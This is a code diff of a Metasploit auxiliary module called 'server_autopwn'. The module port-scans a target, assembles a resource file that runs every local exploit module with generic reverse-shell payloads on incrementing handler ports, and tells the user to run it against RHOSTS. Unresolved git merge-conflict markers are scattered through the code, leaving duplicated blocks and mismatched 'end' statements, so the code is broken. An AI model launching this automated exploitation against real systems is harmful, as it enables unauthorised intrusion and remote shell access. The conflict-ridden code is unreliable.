@@ -5,12 +5,16 @@
 
 require 'msf/base/sessions/scriptable'
 require 'msf/base'
+<<<<<<< HEAD
 
+=======
+>>>>>>> b22dbbe6e215e590f09ffaf00a3d0ab243edae47
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
   include Msf::Session::Scriptable
+<<<<<<< HEAD
     if File.file?("./msfexec.rc")
       File.delete("./msfexec.rc")
     end
@@ -18,6 +22,9 @@ class MetasploitModule < Msf::Auxiliary
       f.puts("back")
       f.puts("set ExitOnSession false")
     }
+=======
+
+>>>>>>> b22dbbe6e215e590f09ffaf00a3d0ab243edae47
  def initialize(info = {})
     super(update_info(info,
       'Name'        => 'server_autopwn',
@@ -47,6 +54,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('EXPLOIT_TIMEOUT', [true, "How long to wait before killing runaway exploits, in seconds", 60])
       ])
   $handler = 2000
+<<<<<<< HEAD
   $sploit_count = 0
   $port_count = 0;
   $done = 0;
@@ -56,6 +64,21 @@ class MetasploitModule < Msf::Auxiliary
  def run_host(ip)
       timeout = datastore['TIMEOUT'].to_i
       ports = Rex::Socket.portspec_crack(datastore['PORTS'])
+=======
+
+      deregister_options('RPORT')
+      end
+      def run_host(ip)
+      timeout = datastore['TIMEOUT'].to_i
+      ports = Rex::Socket.portspec_crack(datastore['PORTS'])
+        if File.file?("./msfexec.rc")
+          File.delete("./msfexec.rc")
+        end
+        open('msfexec.rc', 'a') { |f|
+          f.puts("back")
+          f.puts("set ExitOnSession false")
+        }
+>>>>>>> b22dbbe6e215e590f09ffaf00a3d0ab243edae47
 
       if ports.empty?
         raise Msf::OptionValidateError.new(['PORTS'])
@@ -111,12 +134,20 @@ class MetasploitModule < Msf::Auxiliary
                 end
               end
             end
+<<<<<<< HEAD
         end
+=======
+          end
+>>>>>>> b22dbbe6e215e590f09ffaf00a3d0ab243edae47
           t.each {|x| x.join }
         rescue ::Timeout::Error
           ensure
           t.each {|x| x.kill rescue nil }
+<<<<<<< HEAD
       end
+=======
+        end
+>>>>>>> b22dbbe6e215e590f09ffaf00a3d0ab243edae47
         r.each do |res|
           report_service(:host => res[0], :port => res[1], :state => res[2])
         end
@@ -124,7 +155,10 @@ class MetasploitModule < Msf::Auxiliary
         $payl = "generic_shell_reverse"
         # use port scanning to build script here
         for openport in opentcp do
+<<<<<<< HEAD
           $port_count = opentcp.length
+=======
+>>>>>>> b22dbbe6e215e590f09ffaf00a3d0ab243edae47
           msfmodules = []
           # find modules  and loop over them
           msfmodules = Find.find(datastore['LPATH']).select { |p| /.*\.rb$/ =~ p }
@@ -133,7 +167,11 @@ class MetasploitModule < Msf::Auxiliary
                 open('msfexec.rc', 'a') { |m|
                 mod = mod.gsub(/.*exploits\//, "exploits/")
                 m.puts("use #{mod}")
+<<<<<<< HEAD
                 print_good("Adding exploit: #{mod} for default port #{openport}")
+=======
+                print_good("Adding exploit: #{mod}")
+>>>>>>> b22dbbe6e215e590f09ffaf00a3d0ab243edae47
                 m.puts("set LPORT #{$handler}")
                 # try to guess the payload shell from the current exploit
                 if mod["linux"]
@@ -167,8 +205,12 @@ class MetasploitModule < Msf::Auxiliary
               }
               # increment the handler so that its on a different LPORT
               $handler = $handler + 1
+<<<<<<< HEAD
               $sploit_count = $sploit_count + 1;
             end
+=======
+           end
+>>>>>>> b22dbbe6e215e590f09ffaf00a3d0ab243edae47
           end
         end
       end
@@ -179,6 +221,7 @@ class MetasploitModule < Msf::Auxiliary
       f.puts("jobs -K")
       f.puts("sessions")
     }
+<<<<<<< HEAD
           # run it!
     if $sploit_count > 0
     print_good("#{$sploit_count} exploits added to resource file... good.")
@@ -192,3 +235,9 @@ class MetasploitModule < Msf::Auxiliary
     end
   end                   
 end 
+=======
+    # run it!
+    print_good("Now run 'resource msfexec.rc' to exploit #{datastore['RHOSTS']}")
+  end
+end
+>>>>>>> b22dbbe6e215e590f09ffaf00a3d0ab243edae47
